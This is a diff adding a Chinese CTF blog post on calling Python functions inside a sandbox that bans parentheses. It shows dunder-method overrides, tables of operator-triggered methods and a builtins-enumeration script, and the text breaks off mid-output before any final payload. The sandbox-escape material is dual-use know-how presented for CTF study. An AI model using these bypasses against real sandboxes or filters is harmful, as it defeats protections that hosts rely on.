@@ -1,0 +1,852 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="lexsd6" />
+
+
+
+<meta name="description" content="Python sandbox 逃逸是我入ctf 这个坑第一个接触的课题，当时这个考点有两种考法一个是ssti，另一个是python jail。但是随着探讨下来，Python sandbox 过滤掉(与) 两个括号还能否执行函数？是否还能import os 执行 &#x2F;bin&#x2F;sh这是个一直困扰我的问题。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Python-sandbox bypass &#39;(&#39; and &#39;)&#39; to  calling function">
+<meta property="og:url" content="lexsd6.github.io/2023/04/20/python-sandbox%20bypass%20'()'%20to%20%20runing%20function/index.html">
+<meta property="og:site_name" content="lexsd6&#39;s home">
+<meta property="og:description" content="Python sandbox 逃逸是我入ctf 这个坑第一个接触的课题，当时这个考点有两种考法一个是ssti，另一个是python jail。但是随着探讨下来，Python sandbox 过滤掉(与) 两个括号还能否执行函数？是否还能import os 执行 &#x2F;bin&#x2F;sh这是个一直困扰我的问题。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-04-20T15:01:42.641Z">
+<meta property="article:modified_time" content="2023-04-20T15:01:27.533Z">
+<meta property="article:author" content="lexsd6">
+<meta property="article:tag" content="python">
+<meta name="twitter:card" content="summary">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="lexsd6&#39;s home" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/title.ico">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>Python-sandbox bypass &#39;(&#39; and &#39;)&#39; to  calling function | lexsd6&#39;s home</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+
+
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/lexsd6.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">lexsd6</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle"> Clumsy birds have to start flying early</p>
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:lexsd6@foxmail.com" title="Email"></a>
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                                <a class="fa QQ" href="tencent://message/?uin=2927507170&Menu=yes" title="QQ"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/DragonBones/" rel="tag">DragonBones</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/" rel="tag">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Machine/" rel="tag">Machine</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/c/" rel="tag">c#</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/code/" rel="tag">code</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/crypto/" rel="tag">crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ida/" rel="tag">ida</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/libc/" rel="tag">libc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mics/" rel="tag">mics</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mysql/" rel="tag">mysql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/node-js/" rel="tag">node-js</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/problem-resolve/" rel="tag">problem_resolve</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/re/" rel="tag">re</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ruby/" rel="tag">ruby</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql/" rel="tag">sql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/translate/" rel="tag">translate</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://hexo.io" target="_blank" rel="noopener">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://pages.github.com/" target="_blank" rel="noopener">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://moxfive.xyz/" target="_blank" rel="noopener">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">一梦想成为五边形战士的老菜鸡</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">lexsd6</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/lexsd6.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">lexsd6</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle"> Clumsy birds have to start flying early</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:lexsd6@foxmail.com" title="Email"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                                <a class="fa QQ" target="_blank" href="tencent://message/?uin=2927507170&Menu=yes" title="QQ"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap">
+
+
+
+<article id="post-python-sandbox bypass &#39;()&#39; to  runing function" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2023/04/20/python-sandbox%20bypass%20'()'%20to%20%20runing%20function/" class="article-date">
+      <time datetime="2023-04-20T15:01:42.641Z" itemprop="datePublished">2023-04-20</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Python-sandbox bypass &#39;(&#39; and &#39;)&#39; to  calling function
+    </h1>
+  
+
+
+          <div style="margin-top:10px 0;margin-bottom:15px;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <span class="post-count">3k字</span>
+      </span>
+    </span>
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">阅读时长:</span>
+        <span class="post-count">15分</span>
+      </span>
+    </span>
+</div>
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             
+          
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud" >
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/" rel="tag">python</a></li></ul>
+
+    </div>
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>Python sandbox 逃逸是我入ctf 这个坑第一个接触的课题，当时这个考点有两种考法一个是ssti，另一个是python jail。但是随着探讨下来，Python sandbox 过滤掉<code>(</code>与<code>)</code> 两个括号还能否执行函数？是否还能import os 执行 <code>/bin/sh</code>这是个一直困扰我的问题。<a id="more"></a></p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个问题来源hack the box 一个flask 题目提到 一个奇怪的waf。这个waf  提到”(){}[]@” ,但是按照我们正常的思路，只要ban了<code>{}</code>了，ssti这路就不行。但是为什么要提到<code>()</code>? 于是我想到说不定python有方法做到，不用<code>()</code>就可以做到执行函数方法（执行<code>__call__</code>）。</p>
+<h2 id="object属性与内置函数"><a href="#object属性与内置函数" class="headerlink" title="object属性与内置函数"></a>object属性与内置函数</h2><p>我们知道<strong>对象</strong>（ob） 是 Python 中对数据的抽象。 Python 程序中的所有数据都是由对象或对象间关系来表示的。同时，我们也知道 “x+y” 两变量相加，过程其实是将<code>+</code>转换调用<code>type(x).__add__(x, y)</code> 即调用x对象的父类的·<code>__add__</code>方法。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; x&#x3D;1</span><br><span class="line">&gt;&gt;&gt; y&#x3D;2</span><br><span class="line">&gt;&gt;&gt; type(x).__add__(x,y)</span><br><span class="line">3</span><br><span class="line">&gt;&gt;&gt; x+y</span><br><span class="line">3</span><br></pre></td></tr></table></figure>
+
+<p>所以我们若讲x的父类的<code>__add__</code>覆盖成我们想要的函数，那么就可以用<code>+</code>来执行函数。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; <span class="built_in">type</span>(x).__add__=<span class="built_in">print</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line 1, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: can<span class="string">'t set attributes of built-in/extension type '</span>int<span class="string">' # py 3.8.9</span></span><br><span class="line"><span class="string">TypeError: cannot set '</span>__add__<span class="string">' attribute of immutable type '</span>int<span class="string">'# py 3.10.7</span></span><br></pre></td></tr></table></figure>
+
+<p>但是我们很快得到一个报错，显示我们无法修改 int class 的<code>__add__</code>属性，但在不同版本中报错描述不同。(应该与3.10版本对python进行大规模改写优化有关)。其中在3.10报错中写到<code>immutable type &#39;int&#39;</code>,在3.8报错中更详细写的 <code>built-in/extension type &#39;int&#39;</code>.所以，可以怀疑因为<code>int</code>是内置class（或builtins模块中class） 所以设置了保护属性 让 <code>__add__</code>属性 无法被修改。</p>
+<p>因此，我们可以尝试自己定义一个class来尝试。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">x</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">y=x()</span><br><span class="line">x.__add__=<span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>y+<span class="string">'1'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到我们自己定义的类 x 的 <code>__add__</code>被修改为了<code>print</code> ,在运行<code>y+&#39;1&#39;</code>时，成功执行了 print 方法.</p>
+<h3 id="可利用的内置函数"><a href="#可利用的内置函数" class="headerlink" title="可利用的内置函数"></a>可利用的内置函数</h3><p>其实，经过查阅除了<code>__add__</code>外，还有很多内置函数可以让我们利用。</p>
+<h3 id="计算类内置函数"><a href="#计算类内置函数" class="headerlink" title="计算类内置函数"></a>计算类内置函数</h3><table>
+<thead>
+<tr>
+<th>名称</th>
+<th>作用</th>
+<th>触发示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>object.__add__(self, other)</code></td>
+<td>加法</td>
+<td>x+y</td>
+</tr>
+<tr>
+<td><code>object.__sub__(self, other)</code></td>
+<td>减法</td>
+<td>x-y</td>
+</tr>
+<tr>
+<td><code>object.__mul__(self, other)</code></td>
+<td>乘法</td>
+<td>x*y</td>
+</tr>
+<tr>
+<td><code>object.__truediv__(self, other)</code></td>
+<td>除法</td>
+<td>x/y</td>
+</tr>
+<tr>
+<td><code>object.__floordiv__(self, other)</code></td>
+<td>整除</td>
+<td>x//y</td>
+</tr>
+<tr>
+<td><code>object.__mod__(self, other)</code></td>
+<td>取余</td>
+<td>x%y</td>
+</tr>
+<tr>
+<td><code>object.__pow__(self, other[, modulo])</code></td>
+<td>幂运算</td>
+<td>x**y</td>
+</tr>
+<tr>
+<td><code>object.__lshift__(self, other)</code></td>
+<td>左移</td>
+<td>x&lt;&lt;y</td>
+</tr>
+<tr>
+<td><code>object.__rshift__(self, other)</code></td>
+<td>右移</td>
+<td>x&gt;&gt;y</td>
+</tr>
+<tr>
+<td><code>object.__and__(self, other)</code></td>
+<td>与</td>
+<td>x&amp;y</td>
+</tr>
+<tr>
+<td><code>object.__xor__(self, other)</code></td>
+<td>异或</td>
+<td>x^y</td>
+</tr>
+<tr>
+<td><code>object.__ior__(self, other)</code></td>
+<td>或</td>
+<td>x|y</td>
+</tr>
+</tbody></table>
+<h3 id="比较内置函数"><a href="#比较内置函数" class="headerlink" title="比较内置函数"></a>比较内置函数</h3><table>
+<thead>
+<tr>
+<th>名称</th>
+<th>作用</th>
+<th>触发示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>__lt__</code></td>
+<td>小于</td>
+<td>x&lt;y</td>
+</tr>
+<tr>
+<td><code>__le__</code></td>
+<td>小于等于</td>
+<td>x&lt;=y</td>
+</tr>
+<tr>
+<td><code>__eq__</code></td>
+<td>等于</td>
+<td>x==y</td>
+</tr>
+<tr>
+<td><code>__ne__</code></td>
+<td>不等于</td>
+<td>x!=y</td>
+</tr>
+<tr>
+<td><code>__ge__</code></td>
+<td>大于等于</td>
+<td>x&gt;=y</td>
+</tr>
+<tr>
+<td><code>__gt__</code></td>
+<td>等于</td>
+<td>x&gt;y</td>
+</tr>
+</tbody></table>
+<h3 id="特殊内置函数"><a href="#特殊内置函数" class="headerlink" title="特殊内置函数"></a>特殊内置函数</h3><table>
+<thead>
+<tr>
+<th>名称</th>
+<th>作用</th>
+<th>触发示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>__getitem__</code></td>
+<td>我们用中括号对象中元素的查询</td>
+<td>x[y]</td>
+</tr>
+<tr>
+<td><code>__getattr__</code></td>
+<td>获取对象的属性</td>
+<td>x.y</td>
+</tr>
+<tr>
+<td><code>__getattribute__</code></td>
+<td>在<code>__getattr__</code>未找到属性时调用</td>
+<td>x.y</td>
+</tr>
+</tbody></table>
+<h2 id="builtins中的内鬼"><a href="#builtins中的内鬼" class="headerlink" title="builtins中的内鬼"></a>builtins中的内鬼</h2><p>之前在对<code>int.__add__</code>进行覆盖时，发现触发了报错。这报错让我们知道 Built-in  中的属于是 无法修改的。但是我写了个小工具，来遍历<code>builtins</code> 模块.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">x=__builtins__.__dir__()</span><br><span class="line"><span class="comment">#x=os.__dir__()</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> x:</span><br><span class="line">    print(str(getattr(__builtins__,i).__class__)+<span class="string">' name:'</span>+i)</span><br></pre></td></tr></table></figure>
+
+<p>出乎意料地得到一个有意思的结果：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line">builtins name:__name__</span><br><span class="line">Built-<span class="keyword">in</span> functions, exceptions, and other objects.</span><br><span class="line"></span><br><span class="line"><span class="function">Noteworthy: <span class="title">None</span> <span class="title">is</span> <span class="title">the</span> `<span class="title">nil</span>' <span class="title">object</span>; <span class="title">Ellipsis</span> <span class="title">represents</span> `...' <span class="title">in</span> <span class="title">slices</span>. <span class="title">name:__doc__</span></span></span><br><span class="line"><span class="function"> <span class="title">name:__package__</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">_frozen_importlib.BuiltinImporter</span>'&gt; <span class="title">name:__loader__</span></span></span><br><span class="line"><span class="function"><span class="title">ModuleSpec</span>(<span class="title">name</span>='<span class="title">builtins</span>', <span class="title">loader</span>=&lt;<span class="title">class</span> '<span class="title">_frozen_importlib.BuiltinImporter</span>'&gt;, <span class="title">origin</span>='<span class="title">built</span>-<span class="title">in</span>') <span class="title">name:__spec__</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">__build_class__</span>&gt; <span class="title">name:__build_class__</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">__import__</span>&gt; <span class="title">name:__import__</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">abs</span>&gt; <span class="title">name:abs</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">all</span>&gt; <span class="title">name:all</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">any</span>&gt; <span class="title">name:any</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">ascii</span>&gt; <span class="title">name:ascii</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">bin</span>&gt; <span class="title">name:bin</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">breakpoint</span>&gt; <span class="title">name:breakpoint</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">callable</span>&gt; <span class="title">name:callable</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">chr</span>&gt; <span class="title">name:chr</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">compile</span>&gt; <span class="title">name:compile</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">delattr</span>&gt; <span class="title">name:delattr</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">dir</span>&gt; <span class="title">name:dir</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">divmod</span>&gt; <span class="title">name:divmod</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">eval</span>&gt; <span class="title">name:eval</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">exec</span>&gt; <span class="title">name:exec</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">format</span>&gt; <span class="title">name:format</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">getattr</span>&gt; <span class="title">name:getattr</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">globals</span>&gt; <span class="title">name:globals</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">hasattr</span>&gt; <span class="title">name:hasattr</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">hash</span>&gt; <span class="title">name:hash</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">hex</span>&gt; <span class="title">name:hex</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">id</span>&gt; <span class="title">name:id</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">input</span>&gt; <span class="title">name:input</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">isinstance</span>&gt; <span class="title">name:isinstance</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">issubclass</span>&gt; <span class="title">name:issubclass</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">iter</span>&gt; <span class="title">name:iter</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">aiter</span>&gt; <span class="title">name:aiter</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">len</span>&gt; <span class="title">name:len</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">locals</span>&gt; <span class="title">name:locals</span></span></span><br><span class="line"><span class="function">&lt;<span 